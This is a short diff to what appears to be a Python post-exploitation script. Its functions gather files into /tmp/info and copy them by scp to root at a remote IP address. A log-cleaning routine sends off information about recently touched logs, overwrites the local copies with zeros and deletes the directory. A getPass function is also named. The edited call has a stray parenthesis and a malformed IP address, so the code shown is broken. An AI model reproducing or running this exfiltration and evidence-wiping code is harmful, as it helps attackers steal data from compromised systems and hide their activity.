@@ -178,6 +178,7 @@ def xferFile(dfile,IPandLoc):
     # encode and gzip, then xfer
     # uuencode -m <file to encode>
     # ssh <IP> uuencode -m /bin/ls - | unudecode > ls
+    #zfile=bashCmd("tar -czvf "+dfile+".tar.gz "+dfile)
     bashCmd("scp /tmp/info/"+dfile+" root@"+IPandLoc)
 
 ## this function lists all logs touched today, sends info files to IP/folder location
@@ -213,9 +214,11 @@ def logClean(IPandLoc):
         ###############################################scp here!!
         #bashCmd("scp /tmp/info/"+files2[i]+" root@"+IPandLoc)
         xferFile(files2[i],IPandLoc)
-        size=bashCmd("ls -latr /tmp/info/"+files2[i]).split()    
+        # original file
+        size=bashCmd("ls -latr /tmp/info/"+files2[i]).split() 
         bashCmd("dd if=/dev/zero of=/tmp/info/"+files2[i]+
                 " bs=1 count="+size[4])
+        size=0
     bashCmd("rm -rf /tmp/info/")
 
 def getPass():
@@ -235,7 +238,7 @@ if not os.path.exists('/tmp/info'):
     os.makedirs('/tmp/info')
 
 preLim()
-nextStuff()
-getPass()
-#xferFile()
-logClean("192.168.85.131:/root/Desktop")
+#nextStuff()
+#getPass()
+xferFile("preLiminary","192.168.131:/root/Desktop/info"))
+#logClean("192.168.85.131:/root/Desktop/info")
